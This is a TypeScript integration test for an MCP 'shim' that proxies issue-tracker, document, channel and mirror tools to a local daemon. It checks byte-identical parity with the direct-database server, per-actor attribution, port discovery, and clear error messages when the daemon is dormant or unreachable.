// DL-55 — the thin stdio MCP shim (src/shim.ts) + its parity with the direct-db stdio server (src/server.ts).
//
// Seeds a project through the REAL stdio MCP write path, starts a WRITABLE daemon in-process with the DL-43
// op-API opted in (settings_json.hub.transport="daemon"), writes a DL-41 lifecycle runfile so the shim
// discovers the port THE PRODUCTION WAY (not a hardcoded 8787), then drives `node src/shim.ts` as an MCP
// client and asserts:
//   • the 5 core tools round-trip through the daemon op-API and a write lands ATTRIBUTED to the shim's
//     DEVLOOP_ACTOR (confirmed via list_events on the stdio path — cross-path consistency);
//   • DIFFERENTIAL PARITY — the same read via the shim and via the direct-db server is byte-identical;
//   • two shims with different DEVLOOP_ACTOR multiplex N agents over the one daemon writer;
//   • port discovery works via the runfile AND a DEVLOOP_HUB_PORT override (no 8787 hardcode);
//   • the two failure modes return a CLEAR, actionable MCP error, never a hang/opaque 500: the op-API dormant
//     (hub.transport off → 404), and the daemon down (no runfile, or a stale runfile → ECONNREFUSED).
//
// The whole body runs under try/catch/finally so EVERY spawned MCP subprocess + the in-process daemon/db are
// torn down even on a mid-suite failure — a leaked `node src/shim.ts` child would otherwise wedge the suites
// that run right after this one (daemon.ts / lifecycle.ts).
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { rmSync, mkdirSync, writeFileSync } from "node:fs";
import { execFileSync } from "node:child_process";
import { once } from "node:events";
import { createServer } from "node:net";
import { openDb } from "../src/db.ts";
import { findProject } from "../src/seed.ts";
import { createDaemon } from "../src/daemon.ts";

const ROOT = "/tmp/hub-shim";
const DB = `${ROOT}/hub.db`;
const RUN_DIR = `${ROOT}/run`;     // holds the DL-41 runfile → exercises runfile port-discovery (the AC)
const EMPTY_RUN = `${ROOT}/empty`; // no runfile → the daemon-down / override paths
try { rmSync(ROOT, { recursive: true, force: true }); } catch {}
mkdirSync(RUN_DIR, { recursive: true });
mkdirSync(EMPTY_RUN, { recursive: true });

let fails = 0;
const ok = (cond: boolean, m: string) => { console.log((cond ? "✅ " : "❌ ") + m); if (!cond) fails++; };

// seed the project + the configured agents + operator (ensureActors in seed.ts → dev/qa/pm/operator all exist)
execFileSync("node", ["src/seed.ts", "shm", "Shim Project", "SHM", DB], { encoding: "utf8" });

// ─── MCP client helpers — every spawned client registers in `clients` so finally can tear them ALL down ──────
const clients: Client[] = [];
async function stdio(actor: string): Promise<Client> { // the direct-db server.ts path — seeds + cross-path verifies
  const c = new Client({ name: `shimtest-stdio-${actor}`, version: "0.0.0" });
  await c.connect(new StdioClientTransport({
    command: "node", args: ["src/server.ts"],
    env: { ...process.env, DEVLOOP_ACTOR: actor, DEVLOOP_PROJECT: "shm", DEVLOOP_HUB_DB: DB },
  }));
  clients.push(c);
  return c;
}
async function shim(env: Record<string, string>): Promise<Client> { // the shim under test (env varies per scenario)
  const c = new Client({ name: "shimtest-shim", version: "0.0.0" });
  await c.connect(new StdioClientTransport({
    command: "node", args: ["src/shim.ts"],
    env: { ...process.env, DEVLOOP_PROJECT: "shm", DEVLOOP_HUB_DB: DB, ...env },
  }));
  clients.push(c);
  return c;
}
async function call(c: Client, name: string, args: Record<string, unknown>): Promise<any> {
  const r: any = await c.callTool({ name, arguments: args });
  const text = r.content?.[0]?.text ?? "{}";
  if (r.isError) throw new Error(`${name} failed: ${text}`);
  return JSON.parse(text);
}
async function callRaw(c: Client, name: string, args: Record<string, unknown>): Promise<{ isError: boolean; text: string }> {
  const r: any = await c.callTool({ name, arguments: args });
  return { isError: !!r.isError, text: r.content?.[0]?.text ?? "" };
}

let server: ReturnType<typeof createDaemon> | undefined;
let rdb: ReturnType<typeof openDb> | undefined;
let wdb: ReturnType<typeof openDb> | undefined;
const servers: ReturnType<typeof createDaemon>[] = []; // the extra D1 _team daemon — torn down alongside the main one
const rdbs: ReturnType<typeof openDb>[] = [];           // its read+write connections
try {
  // ─── seed one ticket through the REAL stdio MCP write path (so the daemon reads what an agent wrote) ───
  const pm = await stdio("pm"); // also the cross-path read verifier below (reads are actor-agnostic)
  const feat = await call(pm, "save_issue", { title: "Seed feature", type: "Feature", labels: ["dev-loop", "Feature", "pm"], priority: 2 });

  // ─── start a WRITABLE daemon in-process + opt the op-API in + write the DL-41 runfile the shim discovers ───
  rdb = openDb(DB); rdb.exec("PRAGMA query_only=ON");
  wdb = openDb(DB);
  const projectId = findProject(rdb, "shm")!;
  server = createDaemon({ db: rdb, projectId, projectKey: "shm", writeDb: wdb, actor: "operator" });
  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  const port = (server.address() as { port: number }).port;
  const setTransport = (on: boolean) => { const s = openDb(DB); s.prepare("UPDATE projects SET settings_json=? WHERE id=?").run(JSON.stringify(on ? { hub: { transport: "daemon" } } : {}), projectId); s.close(); };
  setTransport(true);
  // the runfile the DL-41 lifecycle writes (daemon-<key>.json next to the db / in DEVLOOP_RUN_DIR) — the shim
  // reads `.port` from it. host/url/pid/startedAt are recorded for parity with lcWriteRun but the shim uses port.
  writeFileSync(`${RUN_DIR}/daemon-shm.json`, JSON.stringify({ project: "shm", pid: process.pid, port, host: "127.0.0.1", url: `http://127.0.0.1:${port}`, startedAt: new Date().toISOString() }, null, 2));

  // a definitely-closed loopback port (bind :0 → grab → close) for the ECONNREFUSED / stale-runfile path
  const probe = createServer();
  await new Promise<void>((r) => probe.listen(0, "127.0.0.1", () => r()));
  const closedPort = (probe.address() as { port: number }).port;
  await new Promise<void>((r) => probe.close(() => r()));

  // ═══ whoami — answered LOCALLY from env + cwd (no daemon op required) ════════════════════════════════════
  const devShim = await shim({ DEVLOOP_ACTOR: "dev", DEVLOOP_RUN_DIR: RUN_DIR });
  const who = await call(devShim, "whoami", {});
  ok(who.actor === "dev" && who.project === "shm" && who.transport === "daemon" && who.url === `http://127.0.0.1:${port}`,
    `whoami → {actor:dev, project:shm, transport:daemon, url} resolved locally (got ${JSON.stringify(who)})`);

  // ═══ the 5 core tools round-trip through the daemon op-API (runfile port-discovery) ═══════════════════════
  const li = await call(devShim, "list_issues", {});
  ok(Array.isArray(li) && li.length === 1 && li[0].id === feat.id, "shim list_issues → the seeded ticket (via the op-API, port from the runfile)");
  ok((await call(devShim, "list_issues", { type: "Bug" })).length === 0, "shim list_issues?type=Bug → filtered (no bugs yet)");
  const gi = await call(devShim, "get_issue", { id: feat.id });
  ok(gi.id === feat.id && Array.isArray(gi.comments), "shim get_issue → the ticket + its comments");

  // ── save_comment lands ATTRIBUTED to the shim's DEVLOOP_ACTOR (the headline win) ──
  const sc = await call(devShim, "save_comment", { issueId: feat.id, body: "via the shim as dev" });
  ok(sc.author === "dev" && sc.ticket_id === feat.id, "shim save_comment (DEVLOOP_ACTOR=dev) → 200, authored by dev");
  const giAfter = await call(pm, "get_issue", { id: feat.id }); // confirm on the STDIO path (cross-path consistency)
  ok(giAfter.comments.some((c: any) => c.author === "dev" && c.body === "via the shim as dev"), "the shim comment is visible on the stdio path, attributed to dev");
  const evs = await call(pm, "list_events", { limit: 200 });
  ok(evs.some((e: any) => e.actor === "dev" && e.kind === "comment.add" && e.ticket_id === feat.id), "list_events confirms comment.add attributed to dev (X-Devloop-Actor → the shim's actor)");

  // ── multiplexing N agents over the one daemon writer: a SECOND shim with DEVLOOP_ACTOR=qa attributes to qa ──
  const qaShim = await shim({ DEVLOOP_ACTOR: "qa", DEVLOOP_RUN_DIR: RUN_DIR });
  const created = await call(qaShim, "save_issue", { title: "Shim-filed bug", type: "Bug", labels: ["dev-loop", "Bug", "qa"], priority: 1 });
  ok(created.created_by === "qa" && created.type === "Bug" && created.state === "Todo", "shim save_issue create (DEVLOOP_ACTOR=qa) → created_by qa, Todo (multiplexed over one writer)");
  ok((await call(pm, "list_events", { limit: 200 })).some((e: any) => e.actor === "qa" && e.kind === "issue.create" && e.ticket_id === created.id), "list_events confirms issue.create attributed to qa");

  // ── save_issue UPDATE: assignee "me" resolves to the SHIM's actor (dev); REPLACE labels + APPEND-only relatedTo ──
  const upd = await call(devShim, "save_issue", { id: feat.id, assignee: "me", state: "In Progress" });
  ok(upd.assignee === "dev" && upd.state === "In Progress", `shim save_issue update assignee:"me" → the shim's actor (dev); state moved (got assignee=${upd.assignee})`);
  ok((await call(pm, "list_events", { limit: 200 })).some((e: any) => e.actor === "dev" && e.kind === "issue.transition" && e.ticket_id === feat.id), "list_events confirms issue.transition attributed to dev");
  await call(devShim, "save_issue", { id: feat.id, labels: ["dev-loop", "Feature", "pm", "s1"], relatedTo: [created.id] });
  const rel1 = await call(pm, "get_issue", { id: feat.id });
  ok(rel1.labels.includes("s1") && rel1.relatedTo.includes(created.id), "shim save_issue: labels REPLACE (s1 added) + relatedTo APPEND (bug linked)");
  await call(devShim, "save_issue", { id: feat.id, relatedTo: ["SHM-zzz"] }); // a 2nd add — the 1st must survive (union)
  const rel2 = await call(pm, "get_issue", { id: feat.id });
  ok(rel2.relatedTo.includes(created.id) && rel2.relatedTo.includes("SHM-zzz"), "shim save_issue: relatedTo is APPEND-only (the prior link survives a 2nd add)");
  const lc = await call(devShim, "list_comments", { issueId: feat.id });
  ok(Array.isArray(lc) && lc.some((c: any) => c.author === "dev"), "shim list_comments → the dev-authored comment");

  // ═══ DIFFERENTIAL PARITY — the same read via the shim and via the direct-db server is byte-identical ═══════
  // (catches proxy drift: the op-API mirrors server.ts via agentops.ts, and the shim returns its body verbatim)
  const giShim = await call(devShim, "get_issue", { id: feat.id });
  const giStdio = await call(pm, "get_issue", { id: feat.id });
  ok(JSON.stringify(giShim) === JSON.stringify(giStdio), "differential parity: shim get_issue ≡ stdio get_issue (same row, byte-identical)");
  const lsShim = await call(devShim, "list_issues", {});
  const lsStdio = await call(pm, "list_issues", {});
  ok(JSON.stringify(lsShim) === JSON.stringify(lsStdio), "differential parity: shim list_issues ≡ stdio list_issues (byte-identical)");

  // C4: create_issue_label now dispatches through agentOp() on BOTH transports — the STDIO path must now
  // ALSO emit the attributed label.create event (its former native override skipped it, a transport split-brain).
  await call(pm, "create_issue_label", { name: "stdio-made-label", kind: "marker" });
  ok((await call(pm, "list_events", { limit: 200 })).some((e: any) => e.kind === "label.create" && String(e.data).includes("stdio-made-label")),
    "C4: create_issue_label over stdio emits the label.create event (parity with the op-API path)");

  // ═══ (DL-62) the doc/event family through the shim — proxied to the widened op-API ═══════════════════════
  // list_events through the shim ≡ stdio (parity) and surfaces the attributed writes above (Reflect's window)
  const evShim = await call(devShim, "list_events", { limit: 200 });
  const evStdio = await call(pm, "list_events", { limit: 200 });
  ok(JSON.stringify(evShim) === JSON.stringify(evStdio), "differential parity: shim list_events ≡ stdio list_events (byte-identical attribution feed)");
  ok(evShim.some((e: any) => e.actor === "qa" && e.kind === "issue.create"), "shim list_events surfaces the qa-attributed issue.create (Reflect's window now works on the shim)");

  // doc.save through the shim lands a DRAFT attributed to the SHIM's actor (pm) — the headline identity win, for docs
  const pmShim = await shim({ DEVLOOP_ACTOR: "pm", DEVLOOP_RUN_DIR: RUN_DIR });
  const ds1 = await call(pmShim, "doc.save", { slug: "strat", kind: "strategy", title: "Strategy", body: "v1 body", baseVersion: 0 });
  ok(ds1.doc === "strat" && ds1.version === 1 && ds1.status === "draft", `shim doc.save (new) → draft v1 (got ${JSON.stringify(ds1)})`);
  const dh = await call(pmShim, "doc.history", { slug: "strat" });
  ok(Array.isArray(dh) && dh[0].version === 1 && dh[0].author === "pm" && dh[0].status === "draft", "shim doc.history → v1 authored by pm (attribution via env→X-Devloop-Actor)");
  ok((await call(pm, "list_events", { limit: 50 })).some((e: any) => e.actor === "pm" && e.kind === "doc.save"), "list_events (stdio) confirms the shim's doc.save attributed to pm");

  // differential parity on the doc reads: shim ≡ stdio, byte-identical
  ok(JSON.stringify(await call(pmShim, "doc.get", { slug: "strat" })) === JSON.stringify(await call(pm, "doc.get", { slug: "strat" })), "differential parity: shim doc.get ≡ stdio doc.get (unpublished draft)");
  ok(JSON.stringify(await call(pmShim, "doc.list", {})) === JSON.stringify(await call(pm, "doc.list", {})), "differential parity: shim doc.list ≡ stdio doc.list");

  // CAS: a stale baseVersion → CONFLICT (never last-write-wins)
  const docConflict = await callRaw(pmShim, "doc.save", { slug: "strat", kind: "strategy", body: "racey", baseVersion: 0 });
  ok(docConflict.isError && /CONFLICT/.test(docConflict.text), `shim doc.save stale baseVersion → CONFLICT, not last-write-wins (got ${docConflict.text})`);

  // append a real v2 (correct base), then doc.diff parity
  await call(pmShim, "doc.save", { slug: "strat", kind: "strategy", body: "v2 body", baseVersion: 1 });
  const diffShim = await call(pmShim, "doc.diff", { slug: "strat", from: 1, to: 2 });
  ok(JSON.stringify(diffShim) === JSON.stringify(await call(pm, "doc.diff", { slug: "strat", from: 1, to: 2 })) && /v1 body/.test(diffShim.fromBody) && /v2 body/.test(diffShim.toBody), "differential parity: shim doc.diff ≡ stdio doc.diff (unified diff)");

  // operator-publish gate (cooperative): a non-operator shim CANNOT publish; an operator shim CAN
  const docPubByPm = await callRaw(pmShim, "doc.publish", { slug: "strat", version: 2 });
  ok(docPubByPm.isError && /only the operator/.test(docPubByPm.text), `shim doc.publish as pm → rejected (cooperative operator gate; got ${docPubByPm.text})`);
  const opShim = await shim({ DEVLOOP_ACTOR: "operator", DEVLOOP_RUN_DIR: RUN_DIR });
  const docPub = await call(opShim, "doc.publish", { slug: "strat", version: 2 });
  ok(docPub.status === "current" && docPub.current_version === 2, `shim doc.publish as operator → v2 current (got ${JSON.stringify(docPub)})`);
  ok((await call(pmShim, "doc.get", { slug: "strat" })).version === 2 && (await call(pm, "doc.get", { slug: "strat" })).status === "current", "after publish, shim doc.get resolves to the published current v2");

  // ═══ (DL-67) the IM channel family through the shim — proxied to the widened op-API (DRYRUN build-no-network) ══
  const chReg = await call(devShim, "channel.register", { provider: "slack", configRef: "DEVLOOP_CHANNEL_TOKEN", channelRef: "C-SH" });
  ok(chReg.provider === "slack" && chReg.channelRef === "C-SH", `shim channel.register (DEVLOOP_ACTOR=dev) → stored, proxied to the op-API (got ${JSON.stringify(chReg)})`);
  ok((await call(pm, "list_events", { limit: 50 })).some((e: any) => e.actor === "dev" && e.kind === "channel.register"), "list_events (stdio) confirms the shim's channel.register attributed to dev (the identity win, channel family)");
  // channel.status (read) → NAMES + set-flags, never the token; differential parity shim ≡ stdio (byte-identical)
  const chSt = await call(devShim, "channel.status", {});
  ok(chSt.configured === true && chSt.provider === "slack" && !JSON.stringify(chSt).includes("xoxb-"), "shim channel.status → configured, NAMES + set-flags, never the token value (§16)");
  ok(JSON.stringify(chSt) === JSON.stringify(await call(pm, "channel.status", {})), "differential parity: shim channel.status ≡ stdio channel.status (byte-identical)");
  // channel.send notify (DRYRUN) → built §16 allow-listed line carrying the ticket id (no network)
  const chSend = await call(devShim, "channel.send", { kind: "notify", ticketId: feat.id, bailShape: "decision-needed" });
  ok(chSend.dryrun === true && chSend.lines.join(" ").includes(feat.id), `shim channel.send notify (dryrun) → built allow-listed line carries the ticket id (got ${JSON.stringify(chSend.lines)})`);
  // channel.poll with a fixture → ingest + pending; channel.ack drops it (the two-way bridge works over the shim)
  process.env.DEVLOOP_CHANNEL_FIXTURE = JSON.stringify([{ providerMsgId: "950.1", authorRef: "U1", text: "hi director", providerTs: "950.1" }]);
  const chPoll = await call(devShim, "channel.poll", {});
  delete process.env.DEVLOOP_CHANNEL_FIXTURE;
  ok(chPoll.new === 1 && chPoll.pending.length === 1, `shim channel.poll → ingests the fixture msg, pending=1 (got new=${chPoll.new}, pending=${chPoll.pending?.length})`);
  ok((await call(devShim, "channel.ack", { messageId: chPoll.pending[0].messageId })).acted === true, "shim channel.ack → marks the message consumed (attributed via env→X-Devloop-Actor)");

  // ═══ (DL-68) the P7 mirror + label/project family through the shim — the FINAL slice → a 100% drop-in (DRYRUN) ══
  // differential parity on the 3 reads: shim ≡ the direct-db stdio server, byte-identical
  ok(JSON.stringify(await call(devShim, "list_issue_labels", {})) === JSON.stringify(await call(pm, "list_issue_labels", {})), "differential parity: shim list_issue_labels ≡ stdio list_issue_labels (byte-identical)");
  ok(JSON.stringify(await call(devShim, "get_project", {})) === JSON.stringify(await call(pm, "get_project", {})), "differential parity: shim get_project ≡ stdio get_project (byte-identical)");
  ok(JSON.stringify(await call(devShim, "mirror.status", {})) === JSON.stringify(await call(pm, "mirror.status", {})), "differential parity: shim mirror.status ≡ stdio mirror.status (byte-identical)");
  // create_issue_label (write) through the shim → attributed to the shim's actor (dev); round-trips; DL-22 holds
  const clShim = await call(devShim, "create_issue_label", { name: "shim-made-label", kind: "subtype" });
  ok(clShim.name === "shim-made-label" && clShim.kind === "subtype", `shim create_issue_label (DEVLOOP_ACTOR=dev) → round-trips {name,kind} (got ${JSON.stringify(clShim)})`);
  ok((await call(pm, "list_events", { limit: 50 })).some((e: any) => e.actor === "dev" && e.kind === "label.create"), "list_events (stdio) confirms the shim's create_issue_label attributed to dev (the identity win, label family)");
  ok((await call(pm, "list_issue_labels", {})).some((l: any) => l.name === "shim-made-label"), "the shim-created label is visible on the stdio path (one db)");
  const clBad = await callRaw(devShim, "create_issue_label", { name: "shim-ghostkind", kind: "bogus-kind" });
  ok(clBad.isError && /invalid kind/.test(clBad.text), "DL-22: shim create_issue_label bad kind → clean error (not a fake success)");
  ok(!(await call(pm, "list_issue_labels", {})).some((l: any) => l.name === "shim-ghostkind"), "DL-22: the bad-kind label was NOT created via the shim (no dropped-row masquerade)");
  // mirror.push (write, DRYRUN: build-no-network) through the shim → previews ops; differential parity shim ≡ stdio
  const mpShim = await call(devShim, "mirror.push", { teamId: "team_1", tokenEnv: "DEVLOOP_LINEAR_TOKEN" });
  ok(mpShim.dryrun === true && Array.isArray(mpShim.ops) && mpShim.ops.length >= 1, `shim mirror.push (DRYRUN) → previews would-push ops, dryrun:true (got ops=${mpShim.ops?.length})`);
  ok((await call(pm, "list_events", { limit: 50 })).some((e: any) => e.actor === "dev" && e.kind === "mirror.push"), "list_events (stdio) confirms the shim's mirror.push attributed to dev (the identity win, mirror family)");
  const mpStdio = await call(pm, "mirror.push", { teamId: "team_1", tokenEnv: "DEVLOOP_LINEAR_TOKEN" });
  ok(JSON.stringify(mpShim.ops) === JSON.stringify(mpStdio.ops), "differential parity: shim mirror.push DRYRUN ops ≡ stdio mirror.push DRYRUN ops (byte-identical would-push, no network)");
  ok((await call(devShim, "mirror.status", {})).mapped === 0, "DL-11: after DRYRUN mirror.push via shim + stdio, mirror_map is still EMPTY (mapped:0 — no poisoned row persisted)");
  // THE 100% DROP-IN TRIPWIRE: the shim proxies EVERY server.ts tool (a future server.ts tool not proxied trips this)
  const stdioTools = (await pm.listTools()).tools.map((t: any) => t.name).sort();
  const shimTools = (await devShim.listTools()).tools.map((t: any) => t.name).sort();
  ok(JSON.stringify(stdioTools) === JSON.stringify(shimTools) && shimTools.length === 25, `the shim proxies ALL ${stdioTools.length} server.ts tools — a 100% drop-in (got shim=${shimTools.length}, stdio=${stdioTools.length})`);

  // ═══ D1: the `project` override rides BOTH transports identically (shim body ≡ stdio zod arg) ═══════════════
  // The override is resolved at the agentops.ts choke point, so the shim (which just forwards `project` in the
  // op-API JSON body) and the direct-db server MUST return byte-identical results AND byte-identical refusals.
  execFileSync("node", ["src/seed.ts", "shm2", "Shim Sibling", "SH2", DB], { encoding: "utf8" });
  const sweepShim = await shim({ DEVLOOP_ACTOR: "sweep", DEVLOOP_RUN_DIR: RUN_DIR });
  const sweepStd = await stdio("sweep");
  const devStd = await stdio("dev");
  // steward override WRITE through the shim lands in the sibling project, attributed to sweep
  const ovT = await call(sweepShim, "save_issue", { project: "shm2", title: "Steward override via shim", type: "Improvement", labels: ["dev-loop", "pm"] });
  ok(ovT.id.startsWith("SH2-") && ovT.created_by === "sweep", `D1: shim steward save_issue project:shm2 → created in the SIBLING with its prefix, created_by sweep (got ${ovT.id})`);
  // differential parity on the override READS: shim ≡ stdio, byte-identical
  ok(JSON.stringify(await call(sweepShim, "list_issues", { project: "shm2" })) === JSON.stringify(await call(sweepStd, "list_issues", { project: "shm2" })), "D1 differential parity: shim list_issues project:shm2 ≡ stdio (byte-identical sibling board)");
  ok(JSON.stringify(await call(sweepShim, "get_issue", { project: "shm2", id: ovT.id })) === JSON.stringify(await call(sweepStd, "get_issue", { project: "shm2", id: ovT.id })), "D1 differential parity: shim get_issue project:shm2 ≡ stdio (byte-identical overridden read)");
  // FORBIDDEN parity: a delivery actor's override is refused with the SAME error text on both transports
  const devOvShim = await callRaw(devShim, "list_issues", { project: "shm2" });
  const devOvStd = await callRaw(devStd, "list_issues", { project: "shm2" });
  ok(devOvShim.isError && /FORBIDDEN/.test(devOvShim.text), `D1: shim dev list_issues project:shm2 → FORBIDDEN (got ${devOvShim.text})`);
  ok(devOvShim.text === devOvStd.text, "D1 differential parity: the FORBIDDEN refusal is byte-identical shim ≡ stdio (one resolver)");
  // not-found parity: an ALLOWED actor's unknown key gets the same not-found shape on both transports
  const ghostShim = await callRaw(sweepShim, "list_issues", { project: "nope" });
  const ghostStd = await callRaw(sweepStd, "list_issues", { project: "nope" });
  ok(ghostShim.isError && /no such project 'nope'/.test(ghostShim.text) && ghostShim.text === ghostStd.text, `D1 differential parity: steward → unknown key → identical not-found on both transports (got ${ghostShim.text})`);
  // THE SHIPPED STEWARD SHAPE: a steward booted `_team` (exactly how the scheduler + `dev-loop hub start`
  // wire it — the workspace daemon is keyed to _team) reaches a SIBLING project through the _team daemon.
  // Requires _team's OWN settings to opt in (agentApiEnabled reads the BOOTED project) — the regression this
  // guards: a dormant _team mount would kill every steward override on the daemon transport.
  execFileSync("node", ["src/seed.ts", "_team", "Team Intake", "TEAM", DB], { encoding: "utf8" });
  const teamDb = openDb(DB);
  const teamProjectId = findProject(teamDb, "_team")!;
  teamDb.prepare("UPDATE projects SET settings_json=? WHERE id=?").run(JSON.stringify({ hub: { transport: "daemon" } }), teamProjectId);
  teamDb.close();
  const teamRdb = openDb(DB); teamRdb.exec("PRAGMA query_only=ON");
  const teamWdb = openDb(DB);
  rdbs.push(teamRdb, teamWdb);
  const teamServer = createDaemon({ db: teamRdb, projectId: teamProjectId, projectKey: "_team", writeDb: teamWdb, actor: "operator" });
  servers.push(teamServer);
  teamServer.listen(0, "127.0.0.1");
  await once(teamServer, "listening");
  const teamPort = (teamServer.address() as { port: number }).port;
  writeFileSync(`${RUN_DIR}/daemon-_team.json`, JSON.stringify({ project: "_team", pid: process.pid, port: teamPort, host: "127.0.0.1", url: `http://127.0.0.1:${teamPort}`, startedAt: new Date().toISOString() }, null, 2));
  const teamSweepShim = await shim({ DEVLOOP_ACTOR: "sweep", DEVLOOP_PROJECT: "_team", DEVLOOP_RUN_DIR: RUN_DIR });
  ok((await call(teamSweepShim, "whoami", {})).project === "_team", "D1: the steward shim boots against the _team daemon (its own runfile, the shipped shape)");
  const teamOv = await call(teamSweepShim, "save_comment", { project: "shm2", issueId: ovT.id, body: "steward via the _team daemon" });
  ok(teamOv.author === "sweep" && teamOv.ticket_id === ovT.id, `D1: sweep booted _team → override write into the sibling THROUGH the _team daemon (got ${JSON.stringify(teamOv)})`);
  ok(JSON.stringify(await call(teamSweepShim, "get_issue", { project: "shm2", id: ovT.id })) === JSON.stringify(await call(sweepStd, "get_issue", { project: "shm2", id: ovT.id })), "D1 differential parity: the _team-booted steward's override read ≡ stdio (byte-identical)");

  // ═══ port discovery via a DEVLOOP_HUB_PORT OVERRIDE (no runfile present) — proves 8787 is not hardcoded ════
  const overrideShim = await shim({ DEVLOOP_ACTOR: "dev", DEVLOOP_RUN_DIR: EMPTY_RUN, DEVLOOP_HUB_PORT: String(port) });
  const ovli = await call(overrideShim, "list_issues", {});
  ok(Array.isArray(ovli) && ovli.length >= 1, "DEVLOOP_HUB_PORT override (no runfile) → discovers the live daemon (port not hardcoded)");

  // ═══ FAILURE MODE 1 — the op-API is dormant (hub.transport off → 404) → a clear, actionable MCP error ═════
  setTransport(false);
  const dormant = await callRaw(devShim, "list_issues", {});
  ok(dormant.isError && /dormant/i.test(dormant.text) && /hub\.transport/.test(dormant.text), `dormant op-API → clear MCP error naming hub.transport (got ${JSON.stringify(dormant.text)})`);
  ok(!/not found:/.test(dormant.text), "dormant error is the actionable hint, not a raw 'not found' passthrough");
  const dormantDoc = await callRaw(pmShim, "doc.list", {}); // DL-62: the widened doc ops get the SAME clear dormant hint
  ok(dormantDoc.isError && /dormant/i.test(dormantDoc.text) && /hub\.transport/.test(dormantDoc.text), "dormant op-API → the new doc family gets the same clear hint (doc.list), not a hang/opaque error");
  const dormantChan = await callRaw(devShim, "channel.status", {}); // DL-67: the channel family gets the SAME clear dormant hint
  ok(dormantChan.isError && /dormant/i.test(dormantChan.text) && /hub\.transport/.test(dormantChan.text), "dormant op-API → the channel family gets the same clear hint (channel.status)");
  const dormantMir = await callRaw(devShim, "mirror.status", {}); // DL-68: the mirror/label family gets the SAME clear dormant hint
  ok(dormantMir.isError && /dormant/i.test(dormantMir.text) && /hub\.transport/.test(dormantMir.text), "dormant op-API → the mirror/label family gets the same clear hint (mirror.status)");
  setTransport(true);
  ok(Array.isArray(await call(devShim, "list_issues", {})), "re-enabling hub.transport → the shim works again (settings read fresh, no restart)");

  // ═══ FAILURE MODE 2 — the daemon is down: no runfile, and a stale runfile (ECONNREFUSED) → clear errors ═══
  const downShim = await shim({ DEVLOOP_ACTOR: "dev", DEVLOOP_RUN_DIR: EMPTY_RUN }); // no runfile, no DEVLOOP_HUB_PORT
  const down = await callRaw(downShim, "list_issues", {});
  ok(down.isError && /not reachable/i.test(down.text) && /(npm run daemon|daemon up|DEVLOOP_HUB_PORT)/.test(down.text), `no runfile → clear 'daemon not reachable' error naming the fix (got ${JSON.stringify(down.text)})`);
  const downWho = await call(downShim, "whoami", {}); // whoami must NOT require the daemon
  ok(downWho.actor === "dev" && downWho.url === null, "whoami still answers with no daemon (url null) — no hang");

  const refusedShim = await shim({ DEVLOOP_ACTOR: "dev", DEVLOOP_RUN_DIR: EMPTY_RUN, DEVLOOP_HUB_PORT: String(closedPort) });
  const refused = await callRaw(refusedShim, "list_issues", {});
  ok(refused.isError && /not reachable/i.test(refused.text), `a stale runfile / dead daemon (ECONNREFUSED) → clear error, no opaque 500 (got ${JSON.stringify(refused.text)})`);
  const docDown = await callRaw(downShim, "doc.get", { slug: "strat" }); // DL-62: the daemon-down clear error applies to the new ops too (shared proxy())
  ok(docDown.isError && /not reachable/i.test(docDown.text), "daemon-down → the new doc ops get the same clear 'not reachable' error (shared proxy(), no hang/opaque 500)");
  const chanDown = await callRaw(downShim, "channel.status", {}); // DL-67: the channel ops share proxy() → the same clear error
  ok(chanDown.isError && /not reachable/i.test(chanDown.text), "daemon-down → the channel ops get the same clear 'not reachable' error (shared proxy())");
  const mirDown = await callRaw(downShim, "mirror.status", {}); // DL-68: the mirror/label ops share proxy() → the same clear error
  ok(mirDown.isError && /not reachable/i.test(mirDown.text), "daemon-down → the mirror/label ops get the same clear 'not reachable' error (shared proxy())");

  // ═══ back-compat: the stdio server path is byte-for-byte unaffected (server.ts untouched by DL-55) ═══════
  const stdioComment = await call(pm, "save_comment", { issueId: feat.id, body: "stdio still works" });
  ok(stdioComment.author === "pm", "back-compat: the direct-db stdio save_comment still works (server.ts untouched)");
} catch (e) {
  ok(false, `unexpected throw mid-suite: ${(e as Error).message}`); // record it, then fall through to guaranteed cleanup
} finally {
  for (const c of clients) { try { await c.close(); } catch {} } // tear down EVERY spawned MCP subprocess
  try { server?.close(); } catch {}
  for (const s of servers) { try { s.close(); } catch {} }
  try { rdb?.close(); } catch {}
  try { wdb?.close(); } catch {}
  for (const d of rdbs) { try { d.close(); } catch {} }
}

console.log(fails === 0 ? "\nSHIM_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                